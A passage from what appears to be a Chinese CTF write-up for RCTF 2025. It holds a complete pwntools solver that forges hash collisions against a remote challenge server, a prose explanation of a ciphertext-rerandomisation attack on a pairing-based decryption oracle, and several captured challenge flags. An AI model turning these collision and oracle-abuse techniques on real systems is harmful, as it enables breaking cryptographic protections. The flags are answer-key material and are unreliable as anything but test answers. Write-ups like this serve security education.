</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===== 配置 =====</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HOST</span> <span class=o>=</span> <span class=s2>&#34;1.14.196.78&#34;</span>
</span></span><span class=line><span class=cl><span class=n>PORT</span> <span class=o>=</span> <span class=mi>42103</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;info&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===== 工具函数 =====</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pad_block_of_short_msg</span><span class=p>(</span><span class=n>m</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    对长度 &lt;= 15B 的短消息，返回其&#34;首块&#34;（16B）：
</span></span></span><span class=line><span class=cl><span class=s2>    data = m + 0x80 + 0填充至16字节；只取这16字节。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>m</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>15</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>m</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x80</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>16</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>m</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>b2i</span><span class=p>(</span><span class=n>b</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>i2b128</span><span class=p>(</span><span class=n>x</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>,</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_bytes</span><span class=p>(</span><span class=n>a</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>b</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>x</span> <span class=o>^</span> <span class=n>y</span> <span class=k>for</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>recv_prompt</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>prompt</span><span class=o>=</span><span class=sa>b</span><span class=s2>&#34;(hex): &#34;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;稳妥等待输入提示 &#39;(hex): &#39;，避免卡死&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=n>timeout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_hex_get_H</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>raw</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;发送 raw（以hex），并解析返回的 &#39;H = ...&#39; 为 bytes&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>raw</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>EOFError</span><span class=p>(</span><span class=s2>&#34;对端在返回哈希前断开&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 形如: H = f338fbc9e95d95f5a778be8902643b67</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>s</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;H = &#34;</span><span class=p>),</span> <span class=sa>f</span><span class=s2>&#34;意外返回：</span><span class=si>{</span><span class=n>s</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=mi>4</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>recv_round_result</span><span class=p>(</span><span class=n>io</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;发送完4条后读取回合结果行&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>EOFError</span><span class=p>(</span><span class=s2>&#34;对端在回合结果前断开&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=n>res</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 可能还有空行</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>extra</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>extra</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>extra</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===== 关键：每轮4次查询的确定性碰撞 =====</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>play_round</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>round_idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 1/2: 两条&#34;短消息&#34;学习 Δz1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>A_short</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>        <span class=c1># 空串（单块）</span>
</span></span><span class=line><span class=cl>    <span class=n>B_short</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>    <span class=c1># 单字节（单块）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1) A_short</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>recv_prompt</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>                              <span class=c1># 等 &#34;MSG 1 (hex): &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>H1</span> <span class=o>=</span> <span class=n>send_hex_get_H</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>A_short</span><span class=p>)</span>             <span class=c1># 得到 H1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2) B_short</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>recv_prompt</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>                              <span class=c1># 等 &#34;MSG 2 (hex): &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>H2</span> <span class=o>=</span> <span class=n>send_hex_get_H</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>B_short</span><span class=p>)</span>             <span class=c1># 得到 H2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 计算对应的首块 B1, B2（我们本地可完全确定）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>B1</span> <span class=o>=</span> <span class=n>pad_block_of_short_msg</span><span class=p>(</span><span class=n>A_short</span><span class=p>)</span>         <span class=c1># 16B</span>
</span></span><span class=line><span class=cl>    <span class=n>B2</span> <span class=o>=</span> <span class=n>pad_block_of_short_msg</span><span class=p>(</span><span class=n>B_short</span><span class=p>)</span>         <span class=c1># 16B</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 拆 H 为 hi/lo（8B+8B）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>H1_hi</span><span class=p>,</span> <span class=n>H1_lo</span> <span class=o>=</span> <span class=n>b2i</span><span class=p>(</span><span class=n>H1</span><span class=p>[:</span><span class=mi>8</span><span class=p>]),</span> <span class=n>b2i</span><span class=p>(</span><span class=n>H1</span><span class=p>[</span><span class=mi>8</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>    <span class=n>H2_hi</span><span class=p>,</span> <span class=n>H2_lo</span> <span class=o>=</span> <span class=n>b2i</span><span class=p>(</span><span class=n>H2</span><span class=p>[:</span><span class=mi>8</span><span class=p>]),</span> <span class=n>b2i</span><span class=p>(</span><span class=n>H2</span><span class=p>[</span><span class=mi>8</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>    <span class=n>B1_lo</span><span class=p>,</span> <span class=n>B2_lo</span> <span class=o>=</span> <span class=n>b2i</span><span class=p>(</span><span class=n>B1</span><span class=p>[</span><span class=mi>8</span><span class=p>:]),</span> <span class=n>b2i</span><span class=p>(</span><span class=n>B2</span><span class=p>[</span><span class=mi>8</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Δz1 = (Δhi || Δlo)，其中 Δlo 需扣除 y_lo 差异 =&gt; ⊕(B1_lo ⊕ B2_lo)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dz_hi</span> <span class=o>=</span> <span class=n>H1_hi</span> <span class=o>^</span> <span class=n>H2_hi</span>
</span></span><span class=line><span class=cl>    <span class=n>dz_lo</span> <span class=o>=</span> <span class=p>(</span><span class=n>H1_lo</span> <span class=o>^</span> <span class=n>H2_lo</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>B1_lo</span> <span class=o>^</span> <span class=n>B2_lo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Dz</span> <span class=o>=</span> <span class=p>(</span><span class=n>dz_hi</span> <span class=o>&lt;&lt;</span> <span class=mi>64</span><span class=p>)</span> <span class=o>|</span> <span class=n>dz_lo</span>
</span></span><span class=line><span class=cl>    <span class=n>Dz_bytes</span> <span class=o>=</span> <span class=n>i2b128</span><span class=p>(</span><span class=n>Dz</span><span class=p>)</span>                        <span class=c1># 16B</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Step 3/4: 两条&#34;长消息&#34;（32B）对齐第二块状态 + 共用PAD</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 选择任意 16B 的 X，令 X&#39; = X ⊕ Δz1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>X</span>  <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>Xp</span> <span class=o>=</span> <span class=n>xor_bytes</span><span class=p>(</span><span class=n>X</span><span class=p>,</span> <span class=n>Dz_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 构造两条32B消息：A_long = [B1 | X]，B_long = [B2 | X&#39;]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 注意：服务端对任意 msg 都会再追加 0x80 并补到16倍数，</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 所以这两条32B消息最终都会再加一个纯 PAD 块(0x80 + 15*00)作为第3块。</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>A_long</span> <span class=o>=</span> <span class=n>B1</span> <span class=o>+</span> <span class=n>X</span>
</span></span><span class=line><span class=cl>    <span class=n>B_long</span> <span class=o>=</span> <span class=n>B2</span> <span class=o>+</span> <span class=n>Xp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3) A_long</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>recv_prompt</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>                              <span class=c1># 等 &#34;MSG 3 (hex): &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>_</span> <span class=o>=</span> <span class=n>send_hex_get_H</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>A_long</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 4) B_long</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>recv_prompt</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>                              <span class=c1># 等 &#34;MSG 4 (hex): &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>_</span> <span class=o>=</span> <span class=n>send_hex_get_H</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>B_long</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 读回合结果（应为&#34;✅ Hash collision found! Next round.&#34;）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>recv_round_result</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;No hash collision&#34;</span> <span class=ow>in</span> <span class=n>res</span> <span class=ow>or</span> <span class=s2>&#34;Game over&#34;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;第 </span><span class=si>{</span><span class=n>round_idx</span><span class=si>}</span><span class=s2> 轮未碰撞，异常（逻辑应保证碰撞）&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>HOST</span><span class=p>,</span> <span class=n>PORT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>round_idx</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 完成500轮</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>round_idx</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>501</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Round </span><span class=si>{</span><span class=n>round_idx</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>play_round</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>round_idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;完成500轮！等待flag...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 尝试接收所有剩余数据（包括flag）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 接收所有可用的数据</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;连接关闭，尝试接收剩余数据...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 即使连接关闭，也可能有缓冲的数据</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;错误: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=err>🎉</span> <span class=n>Nice</span><span class=err>!</span> <span class=n>Here</span> <span class=ow>is</span> <span class=n>your</span> <span class=n>flag</span><span class=p>:</span> <span class=n>RCTF</span><span class=p>{</span><span class=n>my_sponge_is_toooooooo_soft_cdb801e6adbd</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=repairing>RePairing</h2><ul><li><strong>题目背景：</strong> 这个挑战是个基于 BLS12‑381 配对的公钥加密 oracle。服务端生成 (c1, c2, c3) 密文，并把 shared_key = pairing(&mldr;) 经过 kdf 作为 XOR 密钥加密 flag。服务器会把 banner 发过来里面包括密文和加密 flag，同时接受你发来的 (c1&rsquo;, c2&rsquo;, c3&rsquo;)，解密后返回同一个 kdf(shared_key)。</li><li><strong>攻击思路：</strong> 该方案是可重随机化的。已知原密文 (c1, c2, c3)：<ul><li>选随机标量 r。</li><li>c2&rsquo; = c2 + G1·r，c3&rsquo; = c3 + h1(id)·r，c1&rsquo; = c1 · pk^r。 这三个量依然是合法密文，解出来的 shared_key 与原来一样。你把 (c1&rsquo;, c2&rsquo;, c3&rsquo;) 发给 oracle，它会返回原始的 kdf(shared_key)；再和 banner 中的加密 flag 做 XOR 就能还原 flag。</li></ul></li><li><strong>实现细节：</strong><ul><li>client/src/main.rs 用的是跟服务端一致的 common crate，复用 parse_gt/parse_g1/parse_g2、hex_gt/hex_g1/hex_g2，不会出序列化不一致的问题。</li><li>程序连接 1.14.196.78 (line 42601)，读取 banner，解析出 pk、h1(id)、原密文与加密 flag；用 Fr::rand 生成 r，做上面三步变换，发回新的密文；然后读回 key，并用 xor(&amp;mut enc_flag, &amp;key) 还原明文 flag。</li><li>目前仓库还带有一些 Python 脚本（run_solve_once.py、solve.py 等）作为探索辅助，但正解是 Rust 客户端。</li></ul></li></ul><p>让ai改完代码下载好rust后，运行cargo run -p client即可得到flag</p><p><img src=/img/2025-RCTF/72.png alt=img></p><h1 id=reverse>Reverse</h1><h2 id=chaos>Chaos</h2><p>出糊了变成签到，运行程序即给flag</p><p><img src=/img/2025-RCTF/73.png alt=img></p><p>flag：RCTF{AntiDbg_KeyM0d_2025_R3v3rs3}</p><h2 id=chaos2>chaos2</h2><p>Chaos的revenge版本，看到如下花指令类型</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
